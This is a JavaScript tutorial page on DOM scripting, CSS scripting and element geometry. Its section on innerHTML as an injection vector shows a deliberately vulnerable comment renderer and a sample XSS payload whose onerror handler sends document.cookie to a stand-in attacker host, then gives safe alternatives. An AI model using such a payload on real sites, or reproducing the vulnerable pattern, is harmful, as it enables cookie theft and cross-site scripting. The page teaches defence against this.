DOM & CSS Scripting

Once a browser has parsed HTML into a document, JavaScript's central job begins: finding elements, reading and rewriting what they contain, driving their visual style, and measuring exactly where they land on the rendered page. This page works through the DOM scripting API, the CSS scripting API, and the geometry/scrolling API in the depth you need to use them correctly — including the two places programmers most often get burned: injecting untrusted HTML, and confusing the half-dozen "size" properties an element exposes.

The document as a tree

Every Window has a document property referring to a Document object, which is the root of a tree of Node objects. Most of those nodes are Element nodes (one per HTML tag), but the tree also contains Text nodes (for the literal characters between tags, including whitespace) and occasionally Comment nodes. document.head and document.body give you the two top-level elements directly; everything else has to be located by querying or traversing from there.

This page assumes you already know what the DOM tree conceptually looks like and how events flow through it — see Web Basics & Events for that foundation. Here we cover the practical API surface for reading and rewriting that tree, restyling it, and measuring it once it's rendered.

Selecting elements

Nearly every DOM script starts by selecting one or more elements to work with. The modern, and by far most common, way to do this is with CSS selector syntax passed to querySelector() and querySelectorAll().

A CSS-selector refresher

Because the DOM lets you select with the exact same syntax you write in a stylesheet, it's worth having the vocabulary fresh: 

div                      /* any <div> */
#nav                     /* the element with id="nav" */
.warning                 /* any element with "warning" in its class list */
p[lang="fr"]             /* a <p lang="fr"> */
*[name="x"]              /* any element with a name="x" attribute */
span.fatal.error         /* a <span> with BOTH "fatal" and "error" classes */

#log span                /* any <span> DESCENDANT of #log, any depth */
#log > span              /* any <span> that is a direct CHILD of #log */
body > h1:first-child    /* the first <h1> child of <body> */
img + p.caption          /* a <p class="caption"> immediately after an <img> */
h2 ~ p                   /* any <p> sibling that FOLLOWS an <h2> */

button, input[type="button"]   /* comma = "match either selector" */

With that vocabulary in hand, the two workhorse methods are: 

// First matching element in document order, or null if nothing matches
let spinner = document.querySelector("#spinner");

// EVERY matching element, as a NodeList (not a real array, but iterable
// and indexable; length is 0 if nothing matches)
let titles = document.querySelectorAll("h1, h2, h3");
for (let title of titles) {
  console.log(title.tagName, title.textContent);
}

// Convert to a real array if you want map/filter/reduce
let titleArray = Array.from(titles);

Both methods are also defined on Element, not just Document — calling el.querySelectorAll(...) restricts the search to descendants of el. Two CSS pseudo-elements, ::first-line and ::first-letter, match portions of text rather than real elements and will never match here; many browsers also refuse to return matches for :link/:visited, since that could leak browsing history to a script.

querySelectorAll() vs. the getElementsBy* family

querySelectorAll() returns a static snapshot taken at call time — later DOM changes don't affect the list you already have. The older getElementsByTagName(), getElementsByClassName(), and getElementsByName() methods instead return a live HTMLCollection/NodeList that updates automatically as the document changes underneath it. Iterating a live collection while inserting or removing matching elements is a classic bug: the list's length can shift out from under a running for loop, silently skipping or repeating elements.

closest() and matches()

querySelector() searches downward from an element into its descendants. closest() does the opposite: starting at the element itself and walking upward through ancestors, it returns the first one (element itself included) that matches a selector, or null if none do. It is the natural pairing for event delegation (see Web Basics & Events): 

// event.target might be a <span> or text run inside the <a>,
// not the hyperlink itself -- walk up to find the real link
document.body.addEventListener("click", (event) => {
  let hyperlink = event.target.closest("a[href]");
  if (hyperlink) {
    console.log("Clicked link to", hyperlink.href);
  }
});

// Another common use: "is this node inside some kind of list?"
function insideList(e) {
  return e.closest("ul, ol, dl") !== null;
}

matches() is simpler still: it tests only the element it's called on and returns a boolean, with no traversal at all. 

function isHeading(e) {
  return e.matches("h1,h2,h3,h4,h5,h6");
}

Older selection methods and preselected collections

You will still see an earlier generation of selection methods, especially getElementById(), which remains extremely common because it is marginally faster and very explicit: 

document.getElementById("sect1");            // like querySelector("#sect1")
document.getElementsByName("color");          // elements with name="color" (live)
document.getElementsByTagName("h1");          // all <h1> (live)
sect1.getElementsByTagName("h2");             // scoped to a subtree (live)
document.getElementsByClassName("tooltip");   // like querySelectorAll(".tooltip") (live)

Document also exposes a handful of shortcut properties left over from very old HTML DOM APIs: document.images, document.forms, and document.links (only <a> tags that have an href) give you HTMLCollections of those elements, and unlike a plain NodeList an HTMLCollection can also be indexed by an element's id or name: 

document.forms.address;   // the <form id="address"> (or name="address") element
document.all is dead

document.all, an even older ancestor of these collections that indexes every element in the document, still exists for legacy-compatibility reasons but is deprecated. Don't write new code against it.

Traversing the tree: elements vs. all nodes

Once you've selected a starting element, you often need to walk to its parent, children, or siblings. The DOM gives you two parallel sets of properties for this: one that only ever sees Element nodes, and one defined on every Node that also sees Text and Comment nodes.

Elements only (skip text/comments)All nodes (incl. text/comments)
children, childElementCountchildNodes
firstElementChild / lastElementChildfirstChild / lastChild
nextElementSibling / previousElementSiblingnextSibling / previousSibling
parentNodeparentNode (identical either way)

In practice you almost always want the element-only set: it's rare to care about the whitespace text node sitting between two tags in your source. Here is a depth-first traversal written both ways, to show how the two families mirror each other: 

// Element-only traversal: invoke f() on e and every descendant element
function traverse(e, f) {
  f(e);
  for (let child of e.children) {
    traverse(child, f);
  }
}

// The same traversal written as an explicit linked-list walk
function traverse2(e, f) {
  f(e);
  let child = e.firstElementChild;
  while (child !== null) {
    traverse2(child, f);
    child = child.nextElementSibling;
  }
}

The all-nodes API additionally exposes nodeType (a number: 9 for a Document, 1 for an Element, 3 for Text, 8 for Comment), nodeValue (the text of a Text/Comment node), and nodeName (an element's tag name, uppercased). Here is a hand-rolled reimplementation of textContent that shows how to walk that raw node graph: 

function textContent(e) {
  let s = "";
  for (let child = e.firstChild; child !== null; child = child.nextSibling) {
    if (child.nodeType === 3) {        // Text node
      s += child.nodeValue;
    } else if (child.nodeType === 1) { // Element node -- recurse
      s += textContent(child);
    }
  }
  return s;
}
// In real code just write e.textContent -- this is purely illustrative.
A stray newline changes childNodes

Whitespace between tags in your source becomes real Text nodes, so document.childNodes[0].childNodes[1] is extremely sensitive to formatting: insert one newline between <html> and <head> and the index that used to reach <body> now reaches <head> instead. This is exactly why the element-only properties (firstElementChild, children, etc.) exist and should be your default.

Attributes vs. properties

HTML elements consist of a tag name plus a set of name/value attribute pairs. The generic, always-available way to work with them is the four-method attribute API defined on every Element: 

el.getAttribute("href");
el.setAttribute("href", "https://example.com/");
el.hasAttribute("disabled");
el.removeAttribute("disabled");   // the ONLY way to fully remove an attribute --
                                   // the delete operator does not work here

But for the standard attributes of standard HTML elements, the Element object also mirrors each attribute as a same- or similarly-named JavaScript property, and working with the property is usually more convenient than calling getAttribute()/setAttribute(): 

let image = document.querySelector("#main_image");
image.src;                 // property mirrors the src attribute (as a full URL)
image.id === "main_image"; // => true

let f = document.querySelector("form");
f.action = "https://example.com/submit";
f.method = "POST";

The mapping between attribute names and property names follows a few rules you'll want internalized:

  • Multi-word attributes drop hyphens and capitalize each following word: defaultChecked, tabIndex. Event handler properties like onclick are the exception and stay all-lowercase.
  • Attributes that collide with a JavaScript reserved word get an html prefix — the for attribute of <label> becomes htmlFor.
  • class is the one attribute that breaks even that rule: it becomes className, not htmlClass (see below for the far more useful classList alternative).
  • Some attributes map to a different property than you'd expect: an <input>'s HTML value attribute is mirrored by the property defaultValue, while the JavaScript value property tracks the user's current typed input. Changing .value does not change .defaultValue or the underlying attribute.
  • Boolean and numeric attributes (defaultChecked, maxLength) come back as real booleans/numbers, not strings; event handler properties are functions (or null), never strings.

classList

The class attribute is really a space-separated list, so treating it as one opaque string via className is awkward whenever you want to add or remove a single class. The classList property exposes it as an iterable, set-like object instead: 

let spinner = document.querySelector("#spinner");
spinner.classList.add("animated");        // add one (or more) class names
spinner.classList.remove("hidden");        // remove one (or more)
spinner.classList.toggle("open");           // add if absent, remove if present
spinner.classList.toggle("open", isOpen);    // force add/remove based on a boolean
spinner.classList.contains("selected");       // boolean membership test

Dataset attributes

Any lowercase attribute prefixed data- is valid HTML and never affects rendering, which makes it the standard place to stash extra data for scripts to read. Each Element exposes them through .dataset, with hyphens turned into camelCase: 

<h2 id="title" data-section-number="16.1">Attributes</h2>
let number = document.querySelector("#title").dataset.sectionNumber;
// => "16.1" -- dataset values are ALWAYS strings, even if they look numeric

Reading and writing element content

Ask "what is the content of this <p>?" and there are two equally valid answers: the markup string "This is a <i>simple</i> document", or the plain text "This is a simple document". The DOM gives you both views.

innerHTML, outerHTML, and insertAdjacentHTML()

Reading innerHTML serializes an element's descendants back into a markup string; setting it invokes the browser's own HTML parser and replaces the element's entire contents with the parsed result of the new string: 

document.querySelector("#card").innerHTML =
  "<h3>Title</h3><p>Body text</p>";

outerHTML is the same idea but includes the element's own opening/closing tags: reading it returns the element plus its content, and setting it replaces the element itself (not just its insides) with the parsed markup. insertAdjacentHTML(position, html) inserts a markup string without disturbing the element's existing children at all; position is one of "beforebegin", "afterbegin", "beforeend", or "afterend", naming the four insertion points immediately outside/inside the element's own tags.

innerHTML += is quietly expensive

el.innerHTML += "<li>more</li>" first serializes the entire existing subtree to a string, then re-parses the concatenated result from scratch, throwing away and rebuilding every existing child node (along with any listeners or state attached to them). Use insertAdjacentHTML("beforeend", ...) or the node-creation APIs below instead.

textContent (and why not innerText)

When you want plain text in or out — no HTML parsing, no escaping of angle brackets or ampersands required — use textContent, defined on Node so it works on Text nodes as well as elements: 

let para = document.querySelector("p");
let text = para.textContent;       // all descendant text, concatenated
para.textContent = "Hello World!"; // replaces all children with one Text node

Element also defines a similar-looking innerText property, but it tries to approximate rendered text (collapsing whitespace, respecting display:none, attempting to preserve table layout as spacing) and is inconsistently specified across browsers. Prefer textContent and avoid innerText in new code.

Text inside inline <script> elements

An inline <script> (no src) exposes its raw source through a .text property. Because the HTML parser never interprets angle brackets or ampersands inside a <script> body, giving one a non-JS type attribute (e.g. type="text/x-template") turns it into a convenient, syntax-safe place to embed arbitrary textual data in a page — the JS engine skips executing it, but it stays in the DOM tree for your own code to read via .text.

innerHTML as an injection vector Hard part

This is the single most common way real web applications end up cross-site-scriptable, so it earns a dedicated warning. Any time you build an HTML string that includes data that came from a user — a query parameter, a comment, a display name, a search box — and hand that string to innerHTML, outerHTML, or insertAdjacentHTML(), you are asking the browser to parse and run whatever that user typed. 

// VULNERABLE: attacker-controlled `comment.text` is parsed as markup
function renderComment(comment) {
  let li = document.createElement("li");
  li.innerHTML = `<strong>${comment.author}:</strong> ${comment.text}`;
  commentList.append(li);
}

// If comment.text is the string:
//   <img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
// the browser dutifully creates that <img>, the (broken) src fails to load,
// and onerror fires -- running the attacker's JavaScript in YOUR page's
// origin, with access to cookies, localStorage, and anything else you can do.

The fix is almost never to "sanitize" the string yourself (easy to get subtly wrong); it's to stop treating user data as markup in the first place. Two safe patterns: 

// SAFE #1: textContent never parses -- angle brackets render as literal text
function renderCommentSafe(comment) {
  let li = document.createElement("li");
  let strong = document.createElement("strong");
  strong.textContent = comment.author + ":";
  li.append(strong, " ", comment.text);   // append() accepts strings + nodes
  commentList.append(li);
}

// SAFE #2: if you truly need to build a bigger fragment, keep the
// user-controlled pieces as textContent/attribute assignments and only use
// innerHTML for the FIXED, developer-authored parts of the markup
function renderCard(title, userBio) {
  let card = document.createElement("div");
  card.innerHTML = "<h3></h3><p class=\"bio\"></p>"; // static skeleton, no user data
  card.querySelector("h3").textContent = title;      // safe: assigned as text
  card.querySelector(".bio").textContent = userBio;  // safe: assigned as text
  return card;
}
The rule, stated plainly

Never pass a string built from user input to innerHTML, outerHTML, insertAdjacentHTML(), or document.write(). Use textContent, element properties (.src, .href, .className), or setAttribute() for anything that isn't 100% developer-authored markup. When you genuinely need to render user-authored rich text (a markdown comment, say), run it through a dedicated, well-maintained sanitizing library before it ever reaches innerHTML — do not attempt to hand-roll a blocklist of dangerous tags.

Note that setting innerHTML to a string that contains only markup you wrote (no interpolated user data) is perfectly fine and often the most efficient way to build static structure — the danger is specifically about the provenance of the data, not the API itself.

Creating, inserting, and removing nodes

Beyond string-based HTML/text assignment, the DOM lets you build and rearrange the tree node by node. Create an element with document.createElement(), then use the modern insertion methods to place it: 

let paragraph = document.createElement("p");
let emphasis = document.createElement("em");
emphasis.append("World");                  // append() accepts strings AND nodes
paragraph.append("Hello ", emphasis, "!"); // any number of mixed arguments
paragraph.prepend("¡");                // add at the START of the child list
paragraph.innerHTML;                        // => "¡Hello <em>World</em>!"

String arguments to append()/prepend() are automatically wrapped in Text nodes for you (you can call document.createTextNode() explicitly, but there's rarely a reason to). To insert relative to an existing sibling rather than at the start/end of a parent, use before() and after(), which (unlike append/ prepend) also work on Text nodes: 

let greetings = document.querySelector("h2.greetings");
greetings.after(paragraph, document.createElement("hr")); // insert both after it

// swap an element in place for something else:
greetings.replaceWith(paragraph);

// remove a node from the document entirely:
paragraph.remove();
Inserting an existing node MOVES it

A node can only ever exist at one place in the document. Passing a node that is already attached elsewhere to append(), before(), replaceWith(), or any other insertion method relocates it rather than duplicating it. If you actually want a copy, call node.cloneNode(true) first — the boolean argument controls whether descendants are copied too (cloneNode(false) copies only the node itself, with no children).

An older generation of insertion/removal methods — appendChild(), insertBefore(), replaceChild(), and removeChild() — still works everywhere but is fussier to use correctly (some require a reference to the parent rather than a sibling, and none accept plain strings). New code should reach for append()/prepend()/before()/ after()/replaceWith()/remove() instead.

DocumentFragment for batch insertion

Inserting nodes into a live document one at a time can trigger a separate layout/reflow for each insertion. document.createDocumentFragment() gives you a lightweight, parentless container: you build up a whole subtree inside it off-document, then insert the fragment once, at which point only its children (not the fragment node itself) move into the real tree in a single operation: 

let fragment = document.createDocumentFragment();
for (let item of items) {
  let li = document.createElement("li");
  li.textContent = item.label;
  fragment.append(li);
}
list.append(fragment);   // one reflow, not `items.length` of them

Worked example: generating a table of contents

A single realistic script ties selection, traversal, attributes, and node creation together: scan the document for headings, number them, wrap each in a named anchor, and build a linked table of contents. 

document.addEventListener("DOMContentLoaded", () => {
  let toc = document.querySelector("#TOC");
  if (!toc) {
    toc = document.createElement("div");
    toc.id = "TOC";
    document.body.prepend(toc);
  }

  let headings = document.querySelectorAll("h2,h3,h4,h5,h6");
  let sectionNumbers = [0, 0, 0, 0, 0];

  for (let heading of headings) {
    if (heading.parentNode === toc) continue; // skip anything inside the TOC itself

    let level = parseInt(heading.tagName.charAt(1)) - 1; // <h2> -> level 1
    sectionNumbers[level - 1]++;
    for (let i = level; i < sectionNumbers.length; i++) sectionNumbers[i] = 0;
    let sectionNumber = sectionNumbers.slice(0, level).join(".");

    let span = document.createElement("span");
    span.className = "TOCSectNum";
    span.textContent = sectionNumber;
    heading.prepend(span);

    let anchor = document.createElement("a");
    let fragmentName = `TOC${sectionNumber}`;
    anchor.name = fragmentName;
    heading.before(anchor);
    anchor.append(heading);   // moves the heading INSIDE the new anchor

    let link = document.createElement("a");
    link.href = `#${fragmentName}`;
    link.textContent = heading.textContent; // safe: no untrusted data involved

    let entry = document.createElement("div");
    entry.classList.add("TOCEntry", `TOCLevel${level}`);
    entry.append(link);
    toc.append(entry);
  }
});

Scripting CSS: three levers

JavaScript can drive an element's visual presentation through three mechanisms, roughly in order of how often you should reach for each:

  1. Toggle a class and let a stylesheet you already wrote define what that class means. This keeps presentation decisions in CSS, where they belong, and JS just flips a switch.
  2. Set inline styles via element.style, for values that can only be known at runtime (a computed position, a drag offset, a chart bar's height).
  3. Read (never write) computed styles via getComputedStyle(), when you need to know what the browser actually rendered.

Some of the CSS properties most commonly driven from script: display (set to "none" to hide an element, anything else to reveal it again), position/ top/left (for tooltips, modals, and other dynamically placed content), transform (to shift, scale, or rotate), and transition (the browser animates the change for you — script only needs to trigger it, see § below).

CSS classes

The simplest and most maintainable way to script appearance is exactly the classList API already covered above, applied to presentation classes instead of semantic ones: 

.hidden { display: none; }
let tooltip = document.querySelector("#tooltip"); // starts with class="hidden"
tooltip.classList.remove("hidden");  // show it
tooltip.classList.add("hidden");     // hide it again

Inline styles: element.style

When a stylesheet class can't capture the value (an arbitrary, computed pixel position, for instance), script the style attribute directly. Every element exposes it not as a string but as a live CSSStyleDeclaration object: 

function displayAt(tooltip, x, y) {
  tooltip.style.display = "block";
  tooltip.style.position = "absolute";
  tooltip.style.left = `${x}px`;
  tooltip.style.top = `${y}px`;
}

CSS property names with hyphens (illegal in a JS identifier, since a hyphen reads as subtraction) are camelCased on CSSStyleDeclaration: border-left-width becomes borderLeftWidth, font-family becomes fontFamily, background-color becomes backgroundColor.

Values are strings, and units are mandatory

Every value you assign through .style must be a string, and any property that needs a unit will silently ignore a bare number: 

e.style.marginLeft = 300;      // WRONG -- ignored; not a string
e.style.marginLeft = "300";    // WRONG -- string, but missing units
e.style.marginLeft = "300px";  // correct

// building a computed value: append the unit at the very end
e.style.left = `${x0 + leftBorder + leftPadding}px`;

// shortcut properties work too, as a single string:
e.style.margin = `${top}px ${right}px ${bottom}px ${left}px`;

To copy or serialize an entire inline style at once, use cssText (or the equivalent getAttribute("style")/ setAttribute("style", ...) pair): 

f.style.cssText = e.style.cssText; // copy element e's inline style onto f

Computed styles: getComputedStyle()

element.style only reflects the inline style attribute — it says nothing about rules coming from a stylesheet. To find out what the browser actually used to render an element, ask for its computed style: 

let title = document.querySelector("#section1title");
let styles = window.getComputedStyle(title);
let beforeStyles = window.getComputedStyle(title, "::before"); // pseudo-element, optional 2nd arg

styles.fontSize;   // e.g. "16px" -- always resolved to absolute pixel units

A computed CSSStyleDeclaration differs from an inline one in several important ways:

  • It is entirely read-only — assigning to it does nothing (or throws, depending on the property).
  • Values are absolute: relative units (percentages, em, pt) are resolved to pixels, and colors come back as rgb()/rgba() strings.
  • Shortcut properties don't resolve — querying margin or border gets you nothing useful; query the fully expanded longhands (marginLeft, marginTop, borderLeftWidth, etc.) instead.
  • cssText is undefined on a computed style.
Computed styles can still surprise you

Querying fontFamily just returns whatever comma-separated font stack was specified in CSS (e.g. "arial, helvetica, sans-serif") — it does not tell you which typeface the browser actually picked. And if an element isn't absolutely positioned, its computed top/left often just comes back as the literal string "auto". For position and size, prefer getBoundingClientRect() (below) over parsing computed styles at all.

CSS custom properties (variables) Modern CSS

CSS custom properties — written --like-this and read with var(--like-this) — participate in the same style APIs as ordinary properties, just addressed by string name instead of a camelCase identifier (a JS property name can't start with two hyphens). You read and write them with getPropertyValue()/setProperty() on either an inline or a computed style object: 

:root {
  --accent-color: #6366f1;
  --gap: 12px;
}
.card { border-color: var(--accent-color); padding: var(--gap); }
let root = document.documentElement;

// write: instantly repaints every rule that references var(--accent-color)
root.style.setProperty("--accent-color", "#ef4444");

// read the value as authored on an inline style (may be empty if it's only
// set in a stylesheet rather than inline)
root.style.getPropertyValue("--accent-color");

// read the RESOLVED value, wherever it was actually set
getComputedStyle(root).getPropertyValue("--accent-color").trim(); // "#ef4444"

This is the standard mechanism behind JavaScript-driven theming: flip a handful of custom properties on :root and every rule written in terms of var(--...) updates at once, without touching individual elements' styles.

Scripting stylesheets themselves

Beyond individual elements, JavaScript can manipulate entire stylesheets. A <style> or <link rel="stylesheet"> tag is just a regular element you can select with querySelector(), and both expose a disabled property that flips the whole stylesheet on or off: 

function toggleTheme() {
  let lightTheme = document.querySelector("#light-theme");
  let darkTheme = document.querySelector("#dark-theme");
  if (darkTheme.disabled) {
    lightTheme.disabled = true;
    darkTheme.disabled = false;
  } else {
    lightTheme.disabled = false;
    darkTheme.disabled = true;
  }
}

You can also insert a whole new stylesheet at runtime, either as a <link>: 

function setTheme(name) {
  let link = document.createElement("link");
  link.id = "theme";
  link.rel = "stylesheet";
  link.href = `themes/${name}.css`;

  let current = document.querySelector("#theme");
  current ? current.replaceWith(link) : document.head.append(link);
}

or by injecting a <style> block's markup directly (fine here because the content is developer-authored, not user input — see the innerHTML warning above): 

document.head.insertAdjacentHTML(
  "beforeend",
  "<style>body{transform:rotate(180deg)}</style>"
);

Loaded stylesheets are also reachable programmatically through document.styleSheets, an array-like list of CSSStyleSheet objects (one per <style>/ <link>). Each has a .cssRules list of the individual rules it contains, and you can add or remove rules at runtime with insertRule()/deleteRule(): 

let sheet = document.styleSheets[0];
sheet.insertRule(".flash { background: yellow; }", sheet.cssRules.length);
console.log(sheet.cssRules[0].selectorText); // e.g. "body"
sheet.deleteRule(0);                          // remove the first rule
A same-origin restriction applies

cssRules throws a security exception for stylesheets loaded cross-origin without appropriate CORS headers — you can read the rules of a stylesheet from your own origin, but not arbitrarily inspect one loaded from someone else's CDN. This full rule-level API (formally the "CSS Object Model") is deep enough that most applications never need more than disabled, class toggling, and custom properties.

CSS transitions and animations from script

Given a stylesheet that pairs a transition with a class change: 

.transparent { opacity: 0; }
.fadeable { transition: opacity .5s ease-in; }

script can trigger a fully browser-driven animation just by flipping the class — no JavaScript-side animation loop required: 

// element already has class="fadeable notification"
document.querySelector("#subscribe").classList.add("transparent");
// opacity animates from 1 to 0 over half a second; removing the class
// later fades it back in, since the transition applies either direction

JavaScript can also observe a transition's progress via events fired on the animated element: transitionrun (fires as soon as the transition is triggered, even before any visual change, if transition-delay is set), transitionstart (visual change begins), and transitionend (complete). Handlers receive a TransitionEvent with propertyName (which CSS property animated) and elapsedTime (seconds since the transition started). Full keyframe-based CSS Animations (the animation-name/animation-duration properties plus an @keyframes rule) work the same way from script's perspective: add the class, let CSS run it, and listen for animationstart, animationiteration (fires after each repeat except the last), and animationend, whose AnimationEvent objects carry animationName and elapsedTime.

Document, viewport, and container coordinates

Every element's rendered position is measured in CSS pixels, x increasing rightward and y increasing downward — but relative to what origin? The DOM distinguishes two coordinate systems: document coordinates (relative to the top-left corner of the whole document) and viewport coordinates (relative to the top-left corner of the visible portion of the window, or of the enclosing <iframe> for nested documents; also called "window coordinates"). If the page hasn't been scrolled, the two coincide; once it has, you must add or subtract the scroll offset to convert between them — an element sitting at document y = 200 appears at viewport y = 125 once the user has scrolled down 75px.

In principle a printed-page mental model suggests every element should have one unique position in document coordinates. In practice that breaks down: CSS overflow lets any element become its own scrollable viewport for its content, so there is no single global document coordinate space once nested scrolling is involved. For this reason, client-side JavaScript overwhelmingly uses viewport coordinates — getBoundingClientRect() (below) and the clientX/clientY properties of mouse and pointer events are both viewport-relative.

This also matters for CSS positioning: position:fixed's top/left are viewport-relative; position:relative is relative to the element's own normal-flow position; position:absolute is relative to the document, or to the nearest positioned ancestor if there is one. A common pattern is a position:relative wrapper with top:0; left:0 (so it doesn't otherwise affect layout) purely to establish a local origin — "container coordinates" — for absolutely positioned children inside it.

CSS pixels aren't hardware pixels

On high-density ("retina") displays, one CSS pixel typically maps to several physical device pixels. window.devicePixelRatio reports that ratio (e.g. 2 means each CSS pixel is a 2×2 block of hardware pixels), and it need not be an integer — which is also why fractional CSS coordinates like 3.33px are legal and meaningful rather than rounding artifacts.

Measuring an element: the offset/client/scroll trio Hard part

The most reliable way to get an element's on-screen box is getBoundingClientRect(): it takes no arguments and returns an object with left, top, right, bottom, width, and height, all in viewport coordinates, including border and padding but excluding margin. 

let rect = el.getBoundingClientRect();
// viewport-relative -- add the scroll offset for document-relative values:
let docTop = rect.top + window.scrollY;
let docLeft = rect.left + window.scrollX;

Block elements (images, <div>s, paragraphs) always lay out as one rectangle. Inline elements (<span>, <code>, <b>) can wrap across multiple lines and so occupy multiple disjoint rectangles; getBoundingClientRect() on one of those returns a single rectangle spanning the full bounding box (so it can look surprisingly wide/tall), while getClientRects() returns the individual per-line rectangles.

That covers where an element is. How big it is gets more nuanced, because "size" can mean four genuinely different things depending on whether you count borders, padding, or overflowing content. Every element exposes three parallel triads of properties:

Property pairIncludesExcludes
offsetWidth / offsetHeightcontent + padding + bordermargin
clientWidth / clientHeightcontent + paddingborder, margin, scrollbar
scrollWidth / scrollHeightcontent + padding + any overflowing contentborder, margin

In words: offsetWidth is the full visible box including its border — the largest of the three when there's no overflow. clientWidth peels the border back off, giving you just the padded content area (useful for computing available content space). scrollWidth is the size of the content area as if nothing were clipped — when content fits without scrolling, scrollWidth === clientWidth; the moment content overflows, scrollWidth grows larger than clientWidth to describe the full (including off-screen) content extent. This is exactly how you detect that an element is actually scrollable: 

function isOverflowing(el) {
  return el.scrollWidth > el.clientWidth || el.scrollHeight > el.clientHeight;
}

// how much MORE could this box scroll horizontally?
function maxScrollLeft(el) {
  return el.scrollWidth - el.clientWidth;
}

Each triad has a matching left/top pair: offsetLeft/offsetTop give an element's position relative to its offsetParent (usually the nearest positioned ancestor, or the document for many ordinary elements — not always the viewport, unlike getBoundingClientRect()); clientLeft/clientTop are almost always just the element's left/top border width; and scrollLeft/scrollTop are the only writable members of the whole group — assigning to them scrolls the element's own content within itself. 

// scroll a custom-scrolling panel to its bottom
panel.scrollTop = panel.scrollHeight - panel.clientHeight;
Don't mix these up: two worked comparisons

1. A 200px-wide box with 20px padding and a 5px border, no overflow: offsetWidth is 250 (200 + 2×20 padding + 2×5 border), clientWidth is 240 (200 + 2×20 padding, border excluded), and scrollWidth is also 240, since nothing overflows.

2. The same box, but its content is actually 400px tall and clips: offsetHeight and clientHeight are unchanged (they describe the box's own allotted size, not its content), but scrollHeight jumps to reflect the full 400px+padding of content that exists, only some of which is currently visible. The gap between scrollHeight and clientHeight is precisely how far the element can be scrolled vertically.

Inline elements (<span>, <code>, etc.) return 0 for all of the client* properties, since they don't participate in block layout the same way.

Finding the element at a point

getBoundingClientRect() goes from element to position. document.elementFromPoint(x, y) goes the other way, taking viewport coordinates (the same system as a mouse event's clientX/clientY) and returning whichever element is rendered at that point — specifically the innermost, topmost-stacked (highest effective z-index) element there, though the exact hit-testing algorithm isn't tightly specified across browsers.

Scrolling

window.scrollTo(x, y) takes document coordinates and scrolls so that point sits in the viewport's upper-left corner (clamped if the document doesn't have enough content left to fully satisfy that near an edge): 

let documentHeight = document.documentElement.offsetHeight;
let viewportHeight = window.innerHeight;
window.scrollTo(0, documentHeight - viewportHeight); // jump to the last "page"

window.scrollBy(dx, dy) is the relative version, adding to the current scroll position rather than setting an absolute one — handy, but easy to misuse: 

// scrolls 50px down every 500ms -- note there is no built-in way to STOP this;
// you must keep the interval id and call clearInterval() yourself
let scrollTimer = setInterval(() => scrollBy(0, 50), 500);

Both accept a single options object instead of two numbers when you want the browser to animate the scroll rather than jump instantly: 

window.scrollTo({ left: 0, top: documentHeight - viewportHeight, behavior: "smooth" });

Most of the time, though, you don't want a numeric offset at all — you want a specific element visible. element.scrollIntoView() handles that, scrolling (vertically and, if needed, horizontally) so the element becomes visible. Called with no arguments it aligns the element's top edge near the top of the viewport; called with the single argument false it aligns the bottom edge to the bottom instead. The object form gives finer control: 

el.scrollIntoView({
  behavior: "smooth",   // animate rather than jump
  block: "center",      // vertical alignment: "start" | "center" | "end" | "nearest"
  inline: "nearest",    // horizontal alignment, same set of values
});

Viewport size, content size, and scroll position

For the top-level window, window.innerWidth/ window.innerHeight give the viewport size (mobile pages often pair this with a <meta name="viewport"> tag to declare their intended layout width). The overall document size is the size of document.documentElement (the <html> element) — call getBoundingClientRect() on it, or read its offsetWidth/offsetHeight. The window's current scroll offset is available read-only as window.scrollX/window.scrollY (use scrollTo() to change it, not direct assignment, since these properties can't be set). Individual scrollable elements have their own scrollLeft/scrollTop, which — unlike the window versions — are directly writable, as shown in the geometry section above. Most (but not historically all) browsers also support el.scrollTo()/ el.scrollBy() directly on individual elements, mirroring the Window methods.

IntersectionObserver: efficient visibility detection Modern API

A recurring need — infinite-scroll loading, lazy-loading images, "reveal on scroll" animations, ad-viewability tracking — is knowing when an element scrolls into (or out of) view. Doing this by hand means listening to scroll events and calling getBoundingClientRect() on every handler invocation, which fires dozens of times per second and forces layout recalculation on each call. IntersectionObserver replaces that pattern with an asynchronous, browser-managed callback that only fires when an element's visibility actually crosses a threshold: 

let observer = new IntersectionObserver((entries) => {
  for (let entry of entries) {
    if (entry.isIntersecting) {
      entry.target.classList.add("visible");   // e.g. trigger a reveal animation
    } else {
      entry.target.classList.remove("visible");
    }
  }
}, {
  root: null,          // null = the browser viewport; or pass a scrolling ancestor element
  rootMargin: "0px",   // grow/shrink the root's bounds before computing intersection
  threshold: 0.25,     // fire once at least 25% of the target is visible
});

document.querySelectorAll(".reveal-on-scroll").forEach((el) => observer.observe(el));

// stop watching an element (e.g. once it has been revealed):
// observer.unobserve(el);
// or tear down the whole observer:
// observer.disconnect();

Each entry also carries entry.intersectionRatio (how much of the target is currently visible, 0–1) and entry.boundingClientRect, so you rarely need to call getBoundingClientRect() yourself once an observer is in place. Because the callback is asynchronous and batched by the browser's own rendering pipeline, it stays cheap even when observing hundreds of elements — a common pattern for lazy-loading images below the fold, or for infinite-scroll pagination by observing a sentinel element at the bottom of a list.
